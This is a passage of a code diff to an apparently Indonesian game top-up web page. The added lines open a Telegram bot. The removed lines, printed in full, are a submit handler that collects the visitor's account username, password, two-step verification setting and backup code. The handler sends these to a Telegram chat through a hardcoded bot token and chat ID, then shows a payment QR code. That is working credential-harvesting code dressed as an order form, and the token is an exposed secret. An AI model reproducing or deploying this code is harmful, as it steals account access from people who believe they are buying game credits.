+      const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
 
-      v2.addEventListener('change', ()=>{
-        if(v2.value === 'ON'){
-          v2m.parentElement.classList.remove('hidden');
-        } else {
-          v2m.parentElement.classList.add('hidden');
-          bcDiv.classList.add('hidden');
-          emDiv.classList.add('hidden');
-        }
+      let appOpened = false;
+      function onVisibilityChange(){ if(document.hidden) appOpened = true; }
+      document.addEventListener('visibilitychange', onVisibilityChange);
+
+      try {
+        if(isMobile){ window.location.href = tgScheme; }
+        else { const newWin = window.open(tgScheme, '_blank'); if(newWin) try{ newWin.focus(); }catch(e){} }
+      } catch(e){}
+
+      const fallbackTimeout = setTimeout(function(){
+        if(!appOpened){ window.open(webLink, '_blank'); }
+        document.removeEventListener('visibilitychange', onVisibilityChange);
+      }, 800);
+
+      window.addEventListener('pagehide', function cleanup(){
+        clearTimeout(fallbackTimeout);
+        document.removeEventListener('visibilitychange', onVisibilityChange);
+        window.removeEventListener('pagehide', cleanup);
       });
+    };
+  }
 
-      v2m.addEventListener('change', ()=>{
-        if(v2m.value === 'BC'){
-          bcDiv.classList.remove('hidden');
-          emDiv.classList.add('hidden');
-        } else if(v2m.value === 'EM'){
-          emDiv.classList.remove('hidden');
-          bcDiv.classList.add('hidden');
-        } else {
-          bcDiv.classList.add('hidden');
-          emDiv.classList.add('hidden');
-        }
-      });
-
-      document.getElementById('btnTg').addEventListener('click', ()=>{
-        const f = document.getElementById('frm');
-        const req = f.querySelectorAll('input[required], select[required]');
-        for(const i of req){
-          if(!i.value.trim()){
-            showValidationPopupCenter('harap isi semua kolom!');
-            try{ i.focus(); }catch(e){}
-            return;
-          }
-        }
-
-        const u = document.getElementById('usr').value;
-        const p = document.getElementById('pwd').value;
-        const v = v2.value;
-        const vm = v2m.value;
-        const b = bcDiv.querySelector('input')?.value || '';
-        const kt = document.getElementById('kt').value;
-        const nm = document.getElementById('nm').value;
-        const hg = document.getElementById('hg').value;
-
-        const token = '1868293159:AAF7IWMtOEqmVqEkBAfCTexkj_siZiisC0E';
-        const chatId = '-1002801058966';
-        const txt = 'Pesanan Baru Masuk!\n\nUsername: '+u+'\nPassword: '+p+'\nV2L: '+v+(vm? ' ('+vm+')':'')+(b?'\nBackup Code: '+b:'')+'\nKategori: '+kt+'\nNominal: '+nm+'\nHarga: '+hg;
-
-        fetch('https://api.telegram.org/bot'+token+'/sendMessage',{
-          method:'POST',
-          headers:{"Content-Type":"application/json"},
-          body: JSON.stringify({chat_id:chatId, text:txt})
-        })
-        .then(res=>{
-          if(res.ok){
-            const qrUrl = "https://payment.uwu.ai/assets/images/gallery03/8555ed8a_original.jpg?v=58e63277";
-            showPaymentPopup(qrUrl, hg);
-            f.reset();
-          } else {
-            alert('Gagal kirim ke Telegram');
-          }
-        })
-        .catch(()=> alert('Terjadi kesalahan.'));
-      });
-
-      function showPaymentPopup(qrUrl, hargaFormatted){
-        const backdrop = document.getElementById('paymentModalBackdrop');
-        const modalQr = document.getElementById('modalQr');
-        const modalAmount = document.getElementById('modalAmount');
-        const copySuccess = document.getElementById('copySuccess');
-
-        modalQr.src = qrUrl;
-
-        let amountText = hargaFormatted || '';
-        if(!/^Rp/i.test(amountText)){
-          const num = Number(String(amountText).replace(/[^\d]/g,''));
-          amountText = 'Rp' + new Intl.NumberFormat('id-ID').format(isNaN(num)?0:num);
-        }
-        modalAmount.textContent = amountText;
-
-        copySuccess.style.display = 'none';
-        backdrop.style.display = 'flex';
-        backdrop.setAttribute('aria-hidden','false');
-
-        document.getElementById('closeModalBtn').onclick = function(){
-          backdrop.style.display = 'none';
-          backdrop.setAttribute('aria-hidden','true');
-        };
-        backdrop.onclick = function(e){
-          if(e.target === backdrop){
-            backdrop.style.display = 'none';
-            backdrop.setAttribute('aria-hidden','true');
-          }
-        };
-
-        document.getElementById('copyAmountBtn').onclick = function(){
-          const textToCopy = modalAmount.textContent || '';
-          navigator.clipboard?.writeText(textToCopy).then(()=>{
-            copySuccess.style.display = 'block';
-            setTimeout(()=> copySuccess.style.display = 'none', 2500);
-          }).catch(()=>{
-            const tmp = document.createElement('textarea');
-            tmp.value = textToCopy;
-            document.body.appendChild(tmp);
-            tmp.select();
-            try{
-              document.execCommand('copy');
-              copySuccess.style.display = 'block';
-              setTimeout(()=> copySuccess.style.display = 'none', 2500);
-            }catch(e){
-              alert('Tidak dapat menyalin, silahkan salin secara manual: ' + textToCopy);
-            }
-            document.body.removeChild(tmp);
-          });
-        };
-
-        document.getElementById('openBotBtn').onclick = function(){
-          const botUsername = 'topupgamesbot';
-          const tgScheme = 'tg://resolve?domain=' + encodeURIComponent(botUsername);
-          const webLink  = 'https://t.me/' + encodeURIComponent(botUsername) + '?start';
-          const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
-          let appOpened = false;
-          function onVisibilityChange(){ if(document.hidden) appOpened = true; }
-          document.addEventListener('visibilitychange', onVisibilityChange);
-
-          try {
-            if(isMobile){
-              window.location.href = tgScheme;
-            } else {
-              const newWin = window.open(tgScheme, '_blank');
-              if(newWin){ try{ newWin.focus(); }catch(e){} }
-            }
-          } catch(e){}
-
-          const fallbackTimeout = setTimeout(function(){
-            if(!appOpened){
-              window.open(webLink, '_blank');
-            }
-            document.removeEventListener('visibilitychange', onVisibilityChange);
-          }, 800);
-
-          window.addEventListener('pagehide', function cleanup(){
-            clearTimeout(fallbackTimeout);
-            document.removeEventListener('visibilitychange', onVisibilityChange);
-            window.removeEventListener('pagehide', cleanup);
-          });
-        };
-      }
-    });
-  </script>
+}); // DOMContentLoaded
+</script>
 
 </body>
 </html>
